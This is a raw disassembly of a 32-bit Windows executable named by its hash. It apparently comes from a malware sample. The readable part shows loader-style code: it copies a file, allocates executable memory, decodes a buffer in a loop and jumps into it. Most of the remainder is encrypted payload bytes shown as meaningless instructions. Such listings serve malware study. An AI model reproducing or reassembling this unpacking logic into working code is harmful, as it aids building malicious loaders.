
e0285a10c833c093e4fbb10a9b8499820617d5e06f8bcaf69a7a5619a20ea5d0.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	sub    esp,0xf8
  411006:	push   esi
  411007:	mov    esi,DWORD PTR ds:0x42901c
  41100d:	push   edi
  41100e:	push   0x0
  411010:	push   0x80
  411015:	push   0x3
  411017:	push   0x0
  411019:	push   0x0
  41101b:	push   0x80000000
  411020:	push   0x429228
  411025:	call   esi
  411027:	mov    edi,eax
  411029:	cmp    edi,0xffffffff
  41102c:	mov    DWORD PTR [esp+0xc],edi
  411030:	je     0x41115f
  411036:	push   0x0
  411038:	push   0x80
  41103d:	push   0x4
  41103f:	push   0x0
  411041:	push   0x1
  411043:	push   0x4
  411045:	push   0x429220
  41104a:	call   esi
  41104c:	mov    esi,eax
  41104e:	cmp    esi,0xffffffff
  411051:	jne    0x411061
  411053:	pop    edi
  411054:	mov    eax,0x1
  411059:	pop    esi
  41105a:	add    esp,0xf8
  411060:	ret    
  411061:	push   ebx
  411062:	mov    ebx,DWORD PTR ds:0x429050
  411068:	push   ebp
  411069:	mov    ebp,DWORD PTR ds:0x429074
  41106f:	nop
  411070:	push   0x0
  411072:	lea    eax,[esp+0x14]
  411076:	push   eax
  411077:	push   0xc8
  41107c:	lea    ecx,[esp+0x4c]
  411080:	push   ecx
  411081:	push   edi
  411082:	call   DWORD PTR ds:0x429078
  411088:	test   eax,eax
  41108a:	je     0x4110d1
  41108c:	push   0x2
  41108e:	push   0x0
  411090:	push   0x0
  411092:	push   esi
  411093:	call   ebx
  411095:	mov    edx,DWORD PTR [esp+0x10]
  411099:	push   0x0
  41109b:	push   edx
  41109c:	push   0x0
  41109e:	mov    edi,eax
  4110a0:	push   edi
  4110a1:	push   esi
  4110a2:	call   ebp
  4110a4:	mov    ecx,DWORD PTR [esp+0x10]
  4110a8:	push   0x0
  4110aa:	lea    eax,[esp+0x1c]
  4110ae:	push   eax
  4110af:	push   ecx
  4110b0:	lea    edx,[esp+0x4c]
  4110b4:	push   edx
  4110b5:	push   esi
  4110b6:	call   DWORD PTR ds:0x429080
  4110bc:	mov    eax,DWORD PTR [esp+0x10]
  4110c0:	push   0x0
  4110c2:	push   eax
  4110c3:	push   0x0
  4110c5:	push   edi
  4110c6:	push   esi
  4110c7:	call   DWORD PTR ds:0x42907c
  4110cd:	mov    edi,DWORD PTR [esp+0x14]
  4110d1:	cmp    DWORD PTR [esp+0x10],0xc8
  4110d9:	je     0x411070
  4110db:	push   edi
  4110dc:	mov    edi,DWORD PTR ds:0x429084
  4110e2:	call   edi
  4110e4:	push   esi
  4110e5:	call   edi
  4110e7:	lea    ecx,[esp+0x1c]
  4110eb:	push   ecx
  4110ec:	call   DWORD PTR ds:0x42908c
  4110f2:	mov    ecx,DWORD PTR [esp+0x38]
  4110f6:	xor    edx,edx
  4110f8:	mov    eax,0x21c00
  4110fd:	div    ecx
  4110ff:	mov    edi,DWORD PTR ds:0x429154
  411105:	lea    edx,[esp+0x40]
  411109:	mov    ebx,ecx
  41110b:	mov    esi,eax
  41110d:	imul   esi,ecx
  411110:	push   esi
  411111:	push   0x4291e8
  411116:	push   edx
  411117:	call   edi
  411119:	xor    edx,edx
  41111b:	mov    eax,0x21c00
  411120:	div    ebx
  411122:	lea    eax,[esp+0x4c]
  411126:	add    edx,0x400
  41112c:	push   edx
  41112d:	push   0x4291c0
  411132:	push   eax
  411133:	call   edi
  411135:	push   0x22000
  41113a:	lea    ecx,[esp+0x5c]
  41113e:	push   0x429190
  411143:	push   ecx
  411144:	call   edi
  411146:	mov    edx,0x21c00
  41114b:	sub    edx,esi
  41114d:	push   edx
  41114e:	lea    eax,[esp+0x68]
  411152:	push   0x429168
  411157:	push   eax
  411158:	call   edi
  41115a:	add    esp,0x30
  41115d:	pop    ebp
  41115e:	pop    ebx
  41115f:	pop    edi
  411160:	xor    eax,eax
  411162:	pop    esi
  411163:	add    esp,0xf8
  411169:	ret    
  41116a:	nop
  41116b:	nop
  41116c:	nop
  41116d:	nop
  41116e:	nop
  41116f:	nop
  411170:	sub    esp,0x8
  411173:	push   ebx
  411174:	push   ebp
  411175:	mov    ebp,DWORD PTR [esp+0x20]
  411179:	push   esi
  41117a:	xor    eax,eax
  41117c:	push   edi
  41117d:	mov    edi,DWORD PTR [esp+0x1c]
  411181:	mov    DWORD PTR [esp+0x10],eax
  411185:	mov    esi,0xfffffffd
  41118a:	mov    DWORD PTR [esp+0x14],0x1
  411192:	mov    ecx,DWORD PTR [esp+0x20]
  411196:	mov    cl,BYTE PTR [ecx+esi*1+0x3]
  41119a:	add    esi,0x2
  41119d:	inc    esi
  41119e:	mov    BYTE PTR [esi+edi*1],cl
  4111a1:	movzx  ecx,BYTE PTR [eax+ebp*1]
  4111a5:	mov    edx,DWORD PTR [esp+0x10]
  4111a9:	mov    eax,DWORD PTR [esp+0x14]
  4111ad:	add    edx,eax
  4111af:	mov    DWORD PTR [esp+0x10],edx
  4111b3:	ror    eax,cl
  4111b5:	mov    eax,DWORD PTR [esp+0x10]
  4111b9:	mov    edx,eax
  4111bb:	shr    edx,0x3
  4111be:	mov    ebx,0x1
  4111c3:	sub    ebx,edx
  4111c5:	imul   eax,ebx
  4111c8:	mov    DWORD PTR [esp+0x10],eax
  4111cc:	shl    ebx,0x3
  4111cf:	mov    bl,BYTE PTR [esi+edi*1]
  4111d2:	add    bl,cl
  4111d4:	mov    ecx,DWORD PTR [esp+0x24]
  4111d8:	mov    BYTE PTR [esi+edi*1],bl
  4111db:	sub    esi,0x2
  4111de:	cmp    esi,ecx
  4111e0:	jl     0x411192
  4111e2:	pop    edi
  4111e3:	pop    esi
  4111e4:	pop    ebp
  4111e5:	pop    ebx
  4111e6:	add    esp,0x8
  4111e9:	ret    
  4111ea:	nop
  4111eb:	nop
  4111ec:	nop
  4111ed:	nop
  4111ee:	nop
  4111ef:	nop
  4111f0:	push   ebp
  4111f1:	mov    ebp,esp
  4111f3:	sub    esp,0x70
  4111f6:	mov    DWORD PTR [ebp-0x58],0x0
  4111fd:	mov    DWORD PTR [ebp-0x18],0x0
  411204:	mov    DWORD PTR [ebp-0x54],0x0
  41120b:	mov    DWORD PTR [ebp-0x4c],0x0
  411212:	mov    DWORD PTR [ebp-0x70],0x0
  411219:	mov    DWORD PTR [ebp-0x60],0x0
  411220:	mov    DWORD PTR [ebp-0x8],0x0
  411227:	mov    DWORD PTR [ebp-0x50],0x0
  41122e:	mov    DWORD PTR [ebp-0x48],0x0
  411235:	mov    DWORD PTR [ebp-0x6c],0x0
  41123c:	mov    DWORD PTR [ebp-0x30],0x0
  411243:	mov    DWORD PTR [ebp-0x4],0x0
  41124a:	mov    DWORD PTR [ebp-0x2c],0x0
  411251:	mov    DWORD PTR [ebp-0x14],0x0
  411258:	mov    DWORD PTR [ebp-0x10],0x0
  41125f:	mov    DWORD PTR [ebp-0x68],0x0
  411266:	mov    DWORD PTR [ebp-0x5c],0x0
  41126d:	mov    DWORD PTR [ebp-0xc],0x0
  411274:	mov    eax,ds:0x429254
  411279:	mov    DWORD PTR [ebp-0x28],eax
  41127c:	mov    ecx,DWORD PTR ds:0x429258
  411282:	mov    DWORD PTR [ebp-0x24],ecx
  411285:	mov    edx,DWORD PTR ds:0x42925c
  41128b:	mov    DWORD PTR [ebp-0x20],edx
  41128e:	mov    al,ds:0x429260
  411293:	mov    BYTE PTR [ebp-0x1c],al
  411296:	mov    ecx,DWORD PTR ds:0x429244
  41129c:	mov    DWORD PTR [ebp-0x40],ecx
  41129f:	mov    edx,DWORD PTR ds:0x429248
  4112a5:	mov    DWORD PTR [ebp-0x3c],edx
  4112a8:	mov    eax,ds:0x42924c
  4112ad:	mov    DWORD PTR [ebp-0x38],eax
  4112b0:	mov    cx,WORD PTR ds:0x429250
  4112b7:	mov    WORD PTR [ebp-0x34],cx
  4112bb:	mov    dl,BYTE PTR ds:0x429252
  4112c1:	mov    BYTE PTR [ebp-0x32],dl
  4112c4:	mov    DWORD PTR [ebp-0x30],0x40
  4112cb:	push   0xa
  4112cd:	call   DWORD PTR ds:0x429158
  4112d3:	lea    eax,[ebp-0x10]
  4112d6:	push   eax
  4112d7:	push   0x429230
  4112dc:	call   DWORD PTR ds:0x429004
  4112e2:	test   eax,eax
  4112e4:	je     0x41133c
  4112e6:	push   0x0
  4112e8:	push   0x0
  4112ea:	push   0x0
  4112ec:	call   DWORD PTR ds:0x429040
  4112f2:	mov    DWORD PTR [ebp-0x14],eax
  4112f5:	lea    ecx,[ebp-0x40]
  4112f8:	push   ecx
  4112f9:	lea    edx,[ebp-0x10]
  4112fc:	push   edx
  4112fd:	call   DWORD PTR ds:0x429000
  411303:	test   eax,eax
  411305:	je     0x41133c
  411307:	push   0x108a
  41130c:	push   0x3873f
  411311:	call   DWORD PTR ds:0x42903c
  411317:	mov    eax,DWORD PTR [ebp-0x10]
  41131a:	add    eax,0x1
  41131d:	mov    DWORD PTR [ebp-0x10],eax
  411320:	push   0x14
  411322:	push   0x0
  411324:	mov    ecx,DWORD PTR [ebp-0x14]
  411327:	push   ecx
  411328:	call   DWORD PTR ds:0x429038
  41132e:	push   0x0
  411330:	push   0x0
  411332:	mov    edx,DWORD PTR [ebp-0x14]
  411335:	push   edx
  411336:	call   DWORD PTR ds:0x429034
  41133c:	mov    BYTE PTR [ebp-0x40],0x56
  411340:	call   DWORD PTR ds:0x429030
  411346:	mov    DWORD PTR [ebp-0x2c],eax
  411349:	mov    BYTE PTR [ebp-0x3e],0x72
  41134d:	movzx  eax,WORD PTR [ebp-0x2c]
  411351:	cmp    eax,0x539
  411356:	jne    0x4113a4
  411358:	mov    BYTE PTR [ebp-0x34],0x0
  41135c:	mov    DWORD PTR [ebp-0x14],0xe0d
  411363:	lea    ecx,[ebp-0x28]
  411366:	push   ecx
  411367:	call   DWORD PTR ds:0x42902c
  41136d:	mov    DWORD PTR [ebp-0x60],eax
  411370:	mov    DWORD PTR [ebp-0x54],0x3a
  411377:	lea    edx,[ebp-0x40]
  41137a:	push   edx
  41137b:	mov    eax,DWORD PTR [ebp-0x60]
  41137e:	push   eax
  41137f:	call   DWORD PTR ds:0x429028
  411385:	mov    DWORD PTR [ebp-0x44],eax
  411388:	mov    DWORD PTR [ebp-0x8],0xdb09ca31
  41138f:	push   0x0
  411391:	mov    ecx,DWORD PTR [ebp-0x70]
  411394:	push   ecx
  411395:	call   DWORD PTR ds:0x429014
  41139b:	mov    DWORD PTR [ebp-0x6c],0x110e87
  4113a2:	jmp    0x4113c5
  4113a4:	mov    BYTE PTR ds:0x448090,0x0
  4113ab:	mov    BYTE PTR ds:0x42e210,0x0
  4113b2:	push   0x0
  4113b4:	mov    edx,DWORD PTR [ebp-0x70]
  4113b7:	push   edx
  4113b8:	call   DWORD PTR ds:0x42914c
  4113be:	mov    BYTE PTR ds:0x446060,0x0
  4113c5:	push   DWORD PTR ds:0x42902c
  4113cb:	pop    edx
  4113cc:	mov    DWORD PTR [ebp-0x68],edx
  4113cf:	push   DWORD PTR [ebp-0x30]
  4113d2:	push   0x1000
  4113d7:	mov    eax,DWORD PTR [ebp-0x14]
  4113da:	add    eax,0x23
  4113dd:	add    eax,0x23
  4113e0:	push   eax
  4113e1:	xor    eax,eax
  4113e3:	push   eax
  4113e4:	mov    ecx,DWORD PTR [ebp-0x44]
  4113e7:	call   ecx
  4113e9:	push   eax
  4113ea:	pop    ecx
  4113eb:	mov    DWORD PTR [ebp-0x4],ecx
  4113ee:	mov    eax,DWORD PTR [ebp-0x6c]
  4113f1:	sub    eax,0xdae0b
  4113f6:	mov    DWORD PTR [ebp-0x6c],eax
  4113f9:	cmp    DWORD PTR [ebp-0x4],0x0
  4113fd:	jne    0x41140e
  4113ff:	push   0x0
  411401:	call   DWORD PTR ds:0x42900c
  411407:	mov    BYTE PTR ds:0x446060,0x0
  41140e:	mov    ecx,DWORD PTR [ebp-0x4]
  411411:	add    ecx,DWORD PTR [ebp-0x14]
  411414:	mov    edx,DWORD PTR [ebp-0x8]
  411417:	mov    DWORD PTR [ecx],edx
  411419:	mov    DWORD PTR [ebp-0x2c],0x410000
  411420:	mov    eax,DWORD PTR [ebp-0x60]
  411423:	push   eax
  411424:	call   DWORD PTR ds:0x429024
  41142a:	mov    ecx,DWORD PTR [ebp-0x4]
  41142d:	add    ecx,DWORD PTR [ebp-0x54]
  411430:	mov    DWORD PTR [ebp-0x5c],ecx
  411433:	mov    edx,DWORD PTR ds:0x429028
  411439:	mov    DWORD PTR [ebp-0x4c],edx
  41143c:	mov    eax,DWORD PTR [ebp-0x4]
  41143f:	add    eax,DWORD PTR [ebp-0x14]
  411442:	mov    ecx,DWORD PTR [ebp+0x8]
  411445:	mov    DWORD PTR [eax+0x4],ecx
  411448:	mov    edx,DWORD PTR [ebp-0x4]
  41144b:	add    edx,DWORD PTR [ebp-0x14]
  41144e:	mov    DWORD PTR [ebp-0xc],edx
  411451:	mov    eax,DWORD PTR [ebp-0x70]
  411454:	push   eax
  411455:	call   DWORD PTR ds:0x429150
  41145b:	cmp    DWORD PTR [ebp-0x6c],0x0
  41145f:	jbe    0x41147c
  411461:	mov    ecx,DWORD PTR [ebp-0xc]
  411464:	push   ecx
  411465:	mov    edx,DWORD PTR [ebp-0x14]
  411468:	push   edx
  411469:	mov    eax,DWORD PTR [ebp-0x2c]
  41146c:	add    eax,DWORD PTR [ebp-0x6c]
  41146f:	push   eax
  411470:	mov    ecx,DWORD PTR [ebp-0x4]
  411473:	push   ecx
  411474:	call   0x411170
  411479:	add    esp,0x10
  41147c:	call   DWORD PTR ds:0x429020
  411482:	cmp    DWORD PTR [ebp-0x5c],0x0
  411486:	je     0x411499
  411488:	push   DWORD PTR [ebp-0x4c]
  41148b:	push   DWORD PTR [ebp-0x68]
  41148e:	mov    edx,DWORD PTR [ebp-0x5c]
  411491:	push   eax
  411492:	jmp    edx
  411494:	jmp    0x422f7a
  411499:	mov    edx,DWORD PTR [ebp+0x8]
  41149c:	mov    DWORD PTR [ebp-0x18],edx
  41149f:	push   0x1
  4114a1:	mov    eax,DWORD PTR [ebp-0x70]
  4114a4:	push   eax
  4114a5:	call   DWORD PTR ds:0x429010
  4114ab:	push   es
  4114ac:	dec    edx
  4114ad:	push   ebx
  4114ae:	fsub   DWORD PTR ds:0x8321c864
  4114b5:	sub    DWORD PTR [eax+0x5a82815b],edi
  4114bb:	pusha  
  4114bc:	mov    DWORD PTR [edi-0x64],ebx
  4114bf:	push   ebx
  4114c0:	or     ecx,DWORD PTR [ecx+0x1adeb3c9]
  4114c6:	les    eax,FWORD PTR [eax-0x7e618e11]
  4114cc:	xchg   ebx,eax
  4114cd:	jae    0x4114fb
  4114cf:	dec    ebp
  4114d0:	and    ah,BYTE PTR [ecx]
  4114d2:	lds    esi,FWORD PTR [ebp-0x368ab357]
  4114d8:	out    0x94,al
  4114da:	or     al,0x5c
  4114dc:	sar    BYTE PTR fs:[ebx+0x31],1
  4114e0:	call   0x3fb818c7
  4114e5:	aas    
  4114e6:	lods   eax,DWORD PTR es:[esi]
  4114e8:	mov    ebp,0x39fe4e52
  4114ed:	sub    BYTE PTR [ebx-0x5f2779c5],dh
  4114f3:	and    al,0xf3
  4114f5:	mov    edi,0xad04a344
  4114fa:	inc    eax
  4114fb:	loopne 0x4114da
  4114fd:	js     0x4114d5
  4114ff:	xor    DWORD PTR [ecx+edi*4-0x2db13790],edx
  411506:	sbb    al,BYTE PTR [eax-0x5fc87fc5]
  41150c:	sub    BYTE PTR [ebx+esi*8-0x7b0fb1ae],al
  411513:	xchg   esi,eax
  411514:	sbb    eax,0xe1bad70b
  411519:	push   edx
  41151a:	shr    ebx,cl
  41151c:	push   edi
  41151d:	iret   
  41151e:	dec    ebp
  41151f:	out    dx,eax
  411520:	lods   al,BYTE PTR ds:[esi]
  411521:	daa    
  411522:	div    BYTE PTR [ebp-0x8]
  411525:	jbe    0x4114d6
  411527:	iret   
  411528:	dec    edi
  411529:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41152a:	add    eax,0xec89a4a9
  41152f:	out    0x34,eax
  411531:	ja     0x4114f0
  411533:	xchg   edx,eax
  411534:	stos   DWORD PTR es:[edi],eax
  411535:	imul   esi,DWORD PTR [ebx-0x68],0xffffff9b
  411539:	imul   ebx,DWORD PTR [ebp-0x43],0x43
  41153d:	into   
  41153e:	fs sub eax,0x1531c38c
  411544:	cmp    BYTE PTR [edi-0x3d],dh
  411547:	inc    BYTE PTR [ebp+eax*2-0x4a12a1d6]
  41154e:	push   ebp
  41154f:	jmp    0x4114e3
  411551:	xor    esp,DWORD PTR [ecx-0x7946cc6]
  411557:	jno    0x41155d
  411559:	enter  0x7dd1,0x4
  41155d:	arpl   WORD PTR [ecx+edi*8],dx
  411560:	mov    ah,0x20
  411562:	(bad)
  411566:	push   esp
  411567:	jmp    0x59cd:0x3d2fcf8a
  41156e:	pop    ebp
  41156f:	add    ebp,DWORD PTR [ebx+0x1a]
  411572:	das    
  411573:	icebp  
  411574:	xchg   DWORD PTR [edx-0x5e],esp
  411577:	(bad)  
  411578:	lods   al,BYTE PTR ds:[esi]
  411579:	jl     0x411503
  41157b:	ja     0x4115ba
  41157d:	adc    DWORD PTR [esi-0x1d],0xffffff9a
  411581:	cmp    DWORD PTR [eax+0x2b1e9551],esp
  411587:	ror    ebx,0xce
  41158a:	xchg   ebx,eax
  41158b:	jnp    0x41152c
  41158d:	and    DWORD PTR fs:[eax+0x73],edi
  411591:	cld    
  411592:	out    0xc8,eax
  411594:	loope  0x41155b
  411596:	dec    ecx
  411597:	push   cs
  411598:	sbb    DWORD PTR [ecx-0x6e],eax
  41159b:	loop   0x4115e4
  41159d:	jg     0x41160d
  41159f:	xor    ah,bl
  4115a1:	retf   0x93ea
  4115a4:	jae    0x411621
  4115a6:	test   al,0x8a
  4115a8:	cmp    al,0x54
  4115aa:	div    DWORD PTR ds:0x2a26a0e9
  4115b0:	repnz fnstsw WORD PTR ds:0xcfc64870
  4115b7:	inc    esp
  4115b8:	dec    ebp
  4115b9:	inc    eax
  4115ba:	push   0xadfea2c3
  4115bf:	inc    esi
  4115c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115c1:	push   ss
  4115c2:	push   ds
  4115c3:	cwde   
  4115c4:	jp     0x41161f
  4115c6:	scas   eax,DWORD PTR es:[edi]
  4115c7:	sub    ebx,ecx
  4115c9:	pushw  cs
  4115cb:	mov    esp,0x72349dd1
  4115d0:	fcmove st,st(5)
  4115d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115d3:	test   eax,0xff7c7b10
  4115d8:	nop
  4115d9:	pop    edx
  4115da:	mov    BYTE PTR [eax-0x4ffd8f7],ch
  4115e0:	hlt    
  4115e1:	das    
  4115e2:	test   esi,ebp
  4115e4:	push   ecx
  4115e5:	fnstsw WORD PTR [eax]
  4115e7:	retf   0xa1b5
  4115ea:	push   ecx
  4115eb:	call   FWORD PTR [ecx-0x68]
  4115ee:	or     eax,0x16ad9851
  4115f3:	(bad)  
  4115f4:	pop    ebx
  4115f5:	iret   
  4115f6:	enter  0x1ff5,0xb1
  4115fa:	inc    esp
  4115fb:	mov    ?,eax
  4115fd:	xchg   esi,eax
  4115fe:	aas    
  4115ff:	xor    DWORD PTR [ebx+0x5a],ebp
  411602:	inc    eax
  411603:	out    dx,eax
  411604:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411605:	jne    0x411671
  411607:	sub    al,BYTE PTR [ecx+0x27c19bdb]
  41160d:	es add eax,0x28046044
  411613:	js     0x411640
  411615:	add    eax,0xadc8215e
  41161a:	adc    al,0x5e
  41161c:	cmp    bl,BYTE PTR [esi]
  41161e:	call   0xb1046672
  411623:	and    eax,0x19bd8c75
  411628:	sub    eax,0x10a3ea9a
  41162d:	xchg   dh,ch
  41162f:	mov    esi,0x2b8616c8
  411634:	out    dx,eax
  411635:	test   BYTE PTR ds:0xcf7dfb2b,al
  41163b:	rol    DWORD PTR [ebp+0x25],cl
  41163e:	pop    ebp
  41163f:	loopne 0x41165e
  411641:	sbb    BYTE PTR [esi+edx*4],0x80
  411645:	into   
  411646:	push   cs
  411647:	icebp  
  411648:	mul    DWORD PTR [eax]
  41164a:	and    DWORD PTR [ebp-0x50],eax
  41164d:	jg     0x41160d
  41164f:	mov    ebp,0x61d4427c
  411654:	fisttp QWORD PTR [edx+0x1d]
  411657:	lock enter 0x3a9b,0x4
  41165c:	mov    esi,0xe9015d31
  411661:	jno    0x411674
  411663:	push   eax
  411664:	cmp    DWORD PTR [esi+0x7e378531],ebp
  41166a:	sbb    al,ch
  41166c:	sar    DWORD PTR [eax+edx*1],1
  41166f:	ins    DWORD PTR es:[edi],dx
  411670:	pop    ss
  411671:	push   0xe21337cb
  411676:	lds    esi,FWORD PTR [ebp+eiz*8+0x3c]
  41167a:	sbb    al,0x25
  41167c:	sbb    eax,0xd3d58f9d
  411681:	dec    edx
  411682:	xchg   ebx,eax
  411683:	cmp    al,BYTE PTR [ebx-0x772dd482]
  411689:	ds stc 
  41168b:	aas    
  41168c:	xchg   ebx,eax
  41168d:	add    BYTE PTR [esi+0x63],dh
  411690:	mov    ?,WORD PTR [eax+0x7d]
  411693:	ret    0x1b5
  411696:	jl     0x4116db
  411698:	pop    ecx
  411699:	pop    ss
  41169a:	cld    
  41169b:	mov    DWORD PTR [ebp+0x6a476829],edi
  4116a1:	sbb    al,BYTE PTR [edx-0x2df7f109]
  4116a7:	jmp    0x4c656048
  4116ac:	fld    DWORD PTR [ecx-0x4272a96e]
  4116b2:	inc    edx
  4116b3:	mov    ebx,DWORD PTR [ebx+0x13]
  4116b6:	leave  
  4116b7:	sub    eax,0xfb36fa21
  4116bc:	popf   
  4116bd:	jge    0x41170f
  4116bf:	mov    eax,0xb4d097b9
  4116c4:	sub    esi,DWORD PTR [edx+0x65]
  4116c7:	jns    0x4116ad
  4116c9:	out    dx,al
  4116ca:	xchg   ebx,eax
  4116cb:	adc    edi,ebx
  4116cd:	xchg   esi,eax
  4116ce:	xor    al,0x95
  4116d0:	mov    bl,0x7b
  4116d2:	aam    0x86
  4116d4:	mov    ebp,0x504318d4
  4116d9:	adc    ecx,DWORD PTR [esi]
  4116db:	xchg   edx,eax
  4116dc:	enter  0x9f3e,0xf0
  4116e0:	jmp    0xde9b:0xb7778cb4
  4116e7:	pop    eax
  4116e8:	repnz xor BYTE PTR [edi],0x3c
  4116ec:	inc    edx
  4116ed:	dec    ebp
  4116ee:	or     cl,ah
  4116f0:	fiadd  DWORD PTR [ebx+esi*1-0x18]
  4116f4:	xor    DWORD PTR [ebx-0x4d080089],0xffffffe2
  4116fb:	popf   
  4116fc:	mov    ecx,0x96b8513a
  411701:	je     0x4116fc
  411703:	mov    ah,0x8d
  411705:	mov    dl,BYTE PTR [edi+edx*4+0x58]
  411709:	test   BYTE PTR [edx],ch
  41170b:	not    DWORD PTR [ecx]
  41170d:	xchg   esi,eax
  41170e:	mov    ch,0x8a
  411710:	or     al,0x59
  411712:	out    dx,eax
  411713:	mov    esp,DWORD PTR [esi+0x39]
  411716:	dec    eax
  411717:	test   BYTE PTR [ebx+0x35],bh
  41171a:	dec    ebx
  41171b:	mov    dl,0x9c
  41171d:	into   
  41171e:	mov    ?,WORD PTR [ebx]
  411720:	scas   al,BYTE PTR es:[edi]
  411721:	stos   DWORD PTR es:[edi],eax
  411722:	xor    al,0x79
  411724:	sahf   
  411725:	mov    DWORD PTR [edi],esp
  411727:	and    BYTE PTR [ecx],cl
  411729:	adc    ebx,DWORD PTR [edi*1+0x46bff3a9]
  411730:	sbb    edi,DWORD PTR [ebx]
  411732:	stos   BYTE PTR es:[edi],al
  411733:	adc    DWORD PTR [ebp*2+0x59420b2a],ebx
  41173a:	jl     0x411756
  41173c:	mov    ch,0xf9
  41173e:	js     0x4116fb
  411740:	mov    ebp,ss
  411742:	push   edx
  411743:	xor    al,0xdd
  411745:	push   edi
  411746:	xor    edx,0x3a9b8888
  41174c:	add    BYTE PTR [esi-0x5e],al
  41174f:	bound  edi,QWORD PTR [ecx-0x3adfb6eb]
  411755:	push   ebx
  411756:	ja     0x411778
  411758:	mov    edi,0x81f49d43
  41175d:	mov    cl,0x79
  41175f:	cmc    
  411760:	dec    edx
  411761:	sub    BYTE PTR [edx+0x4e],ch
  411764:	or     esp,DWORD PTR [edx]
  411766:	and    esi,DWORD PTR [esi]
  411768:	fldcw  WORD PTR [edi]
  41176a:	or     BYTE PTR [edx+ebp*8-0x6c2f6b25],dh
  411771:	mov    esp,DWORD PTR [ecx-0x49]
  411774:	ret    0x9312
  411777:	dec    esp
  411778:	stos   DWORD PTR es:[edi],eax
  411779:	leave  
  41177a:	pop    ds
  41177b:	jmp    0x4117c7
  41177d:	sar    DWORD PTR [eax+eiz*4],cl
  411780:	inc    ebp
  411781:	cdq    
  411782:	pop    ebx
  411783:	loop   0x41176b
  411785:	xor    eax,0x7a93d880
  41178a:	cwde   
  41178b:	and    eax,0x1c5b6a03
  411790:	(bad)  
  411791:	ss repz push ebx
  411794:	inc    esi
  411795:	test   DWORD PTR [edi+0xfc26ca],0x2dbf2fb9
  41179f:	fst    DWORD PTR [eax-0x3abdfc10]
  4117a5:	mov    edi,0x74774d04
  4117aa:	dec    eax
  4117ab:	pop    esi
  4117ac:	mov    ebp,0x30029d3e
  4117b1:	mov    al,ds:0x184b193f
  4117b6:	addr16 repnz xor al,0xf4
  4117ba:	ja     0x41174d
  4117bc:	call   0xf44c:0x86a288c3
  4117c3:	fist   DWORD PTR [esi]
  4117c5:	adc    al,0x1a
  4117c7:	fdiv   QWORD PTR [esi+edx*4-0x722ba494]
  4117ce:	and    eax,0xf436ee42
  4117d3:	mov    BYTE PTR [eax-0x45222010],0x89
  4117da:	dec    ecx
  4117db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117dc:	and    DWORD PTR [ecx-0x6e5f6bac],0xd0a6ea40
  4117e6:	pop    ebx
  4117e7:	cmp    esi,DWORD PTR [edi]
  4117e9:	push   esp
  4117ea:	mov    bh,0xd4
  4117ec:	mov    al,0xe2
  4117ee:	ja     0x41178e
  4117f0:	repz pop ds
  4117f2:	sub    ebp,DWORD PTR [eax]
  4117f4:	jl     0x411846
  4117f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117f7:	sbb    BYTE PTR [esi+eiz*4],cl
  4117fa:	inc    ebp
  4117fb:	mov    ch,0xc0
  4117fd:	sub    al,0x58
  4117ff:	shr    BYTE PTR [edi],cl
  411801:	mov    ds:0x18675a5b,eax
  411806:	in     eax,dx
  411807:	mov    al,0x66
  411809:	xor    esi,DWORD PTR [eax+eiz*8-0x20]
  41180d:	call   0x9226:0xc40f8d2
  411814:	iret   
  411815:	js     0x411856
  411817:	push   esp
  411818:	(bad)  
  411819:	in     eax,dx
  41181a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41181b:	and    BYTE PTR [edx-0x37b02d52],bl
  411821:	add    al,0x67
  411823:	repnz mov ds:0x7340ba6d,eax
  411829:	dec    ebx
  41182a:	lds    ebp,FWORD PTR [ecx+0x4c]
  41182d:	xchg   ecx,eax
  41182e:	adc    esi,DWORD PTR [esp+eax*1+0x1579f6d7]
  411835:	pop    ebx
  411836:	lock sbb DWORD PTR [esi+ebx*2+0x6209c450],ebp
  41183e:	les    esp,FWORD PTR [edi+esi*8]
  411841:	push   eax
  411842:	ffreep st(3)
  411844:	clc    
  411845:	xchg   BYTE PTR [edx-0x5f],bh
  411848:	retf   0xa8f2
  41184b:	sub    ch,BYTE PTR [ebx]
  41184d:	xchg   ebp,eax
  41184e:	mov    DWORD PTR [edx],esp
  411850:	pop    esi
  411851:	sar    BYTE PTR [edx],0xb0
  411854:	dec    edi
  411855:	pop    esi
  411856:	mov    al,ds:0xf511c3da
  41185b:	add    DWORD PTR [ebx+0x8],0xffffffe1
  41185f:	add    ecx,edi
  411861:	mov    edi,DWORD PTR [edi+0x12]
  411864:	adc    bl,BYTE PTR [ebp-0x53]
  411867:	shl    BYTE PTR [esp+edi*1-0x68],0x8e
  41186c:	scas   eax,DWORD PTR es:[edi]
  41186d:	jbe    0x411864
  41186f:	test   al,0x8d
  411871:	call   0x4143acd8
  411876:	ror    BYTE PTR [ecx+0x4d6483bc],0xe4
  41187d:	or     DWORD PTR gs:[ebx],0x54d2b0e8
  411884:	sbb    al,0x71
  411886:	imul   eax,DWORD PTR [edx],0x69
  411889:	mov    DWORD PTR [esp+eiz*2-0x42b6e85e],edx
  411890:	mov    bl,0xf3
  411892:	enter  0x3636,0x3b
  411896:	icebp  
  411897:	mov    ds:0x7d7cd063,eax
  41189c:	shr    BYTE PTR [ebp-0x2646b74a],cl
  4118a2:	push   ebx
  4118a3:	xchg   edi,eax
  4118a4:	dec    edx
  4118a5:	xchg   ecx,eax
  4118a6:	jnp    0x41182d
  4118a8:	sub    esp,esi
  4118aa:	xlat   BYTE PTR ds:[ebx]
  4118ab:	stc    
  4118ac:	push   cs
  4118ad:	es pop esi
  4118af:	in     eax,dx
  4118b0:	jecxz  0x411927
  4118b2:	fimul  DWORD PTR [edx+ebx*1+0x29d34234]
  4118b9:	or     al,BYTE PTR [ebx+0x581ed38b]
  4118bf:	xchg   ecx,eax
  4118c0:	nop
  4118c1:	mov    al,ds:0x41050b2e
  4118c6:	cmp    eax,0xac901443
  4118cb:	mov    edi,0x16cf2aab
  4118d0:	xchg   esp,eax
  4118d1:	out    dx,eax
  4118d2:	dec    ebx
  4118d3:	dec    esi
  4118d4:	clc    
  4118d5:	add    ebp,eax
  4118d7:	inc    edx
  4118d8:	and    eax,0x57f53caa
